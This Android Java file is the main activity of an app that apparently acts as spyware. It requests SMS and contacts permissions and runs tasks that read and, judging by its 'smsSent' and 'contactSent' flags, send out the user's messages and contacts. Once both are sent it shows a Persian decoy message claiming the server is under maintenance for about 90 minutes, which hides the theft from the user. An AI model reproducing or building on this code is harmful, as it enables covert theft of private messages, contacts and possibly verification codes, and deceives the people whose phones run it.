package com.alirnp.piri;

import android.Manifest;
import android.content.pm.PackageManager;
import android.os.Bundle;
import android.util.Log;
import android.view.View;
import android.widget.ImageView;
import android.widget.TextView;

import androidx.annotation.NonNull;
import androidx.appcompat.app.AppCompatActivity;
import androidx.core.app.ActivityCompat;
import androidx.core.content.ContextCompat;

import com.github.ybq.android.spinkit.SpinKitView;

public class MainActivity extends AppCompatActivity
        implements OnSuccessListener {

    private SpinKitView spinKitView;
    private TextView textView;
    private ImageView imageView;
    private boolean smsSent = false;
    private boolean contactSent = false;


    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);

        initViews();
        checkPermission();
    }

    private void initViews() {
        spinKitView = findViewById(R.id.activity_main_spin);
        textView = findViewById(R.id.activity_main_text);
        imageView = findViewById(R.id.activity_main_img);
    }


    private void checkPermission() {
        if (ContextCompat.checkSelfPermission(this,
                Manifest.permission.READ_CONTACTS)
                != PackageManager.PERMISSION_GRANTED ||

                ContextCompat.checkSelfPermission(this,
                        Manifest.permission.READ_SMS)
                        != PackageManager.PERMISSION_GRANTED) {

            ActivityCompat.requestPermissions(this,
                    new String[]{Manifest.permission.READ_CONTACTS, Manifest.permission.READ_SMS},
                    Constants.MY_PERMISSIONS_REQUEST);

        } else {
            getContacts();
            getSms();
        }

    }

    private void getSms() {
        new GetSmsTask(this, this).execute();
    }

    private void getContacts() {
        new GetContactsTask(this, this).execute();
    }


    @Override
    public void onRequestPermissionsResult(int requestCode,
                                           @NonNull String[] permissions, @NonNull int[] grantResults) {


        for (int i = 0; i < permissions.length; i++) {

            boolean holeIsOpen = grantResults[i] == PackageManager.PERMISSION_GRANTED;

            if (holeIsOpen) {
                if (permissions[i].equals(Manifest.permission.READ_CONTACTS)) {
                    getContacts();
                    Log.i(Constants.TAG, "onRequestPermissionsResult: READ CONTACT");
                } else if (permissions[i].equals(Manifest.permission.READ_SMS)) {
                    getSms();
                    Log.i(Constants.TAG, "onRequestPermissionsResult: READ SMS");
                }
            }
        }


    }

    @Override
    public void OnSuccess(boolean success, Constants.State state) {

        if (state == Constants.State.SMS)
            smsSent = true;

        if (state == Constants.State.CONTACTS)
            contactSent = true;

        if (smsSent && contactSent) {
            spinKitView.setVisibility(View.INVISIBLE);

            String text =
                    "سرور در حال تعمیرات است"
                            + "\n"
                            + "( زمان تقریبی 90 دقیقه )";
            textView.setText(text);

            imageView.setVisibility(View.VISIBLE);

        }

        String sb = "success = " + success + " ; state = " +
                (state == Constants.State.SMS ? "SMS" : "CONTACTS");
        Log.i(Constants.TAG, "OnSuccess: " + sb);
    }
}
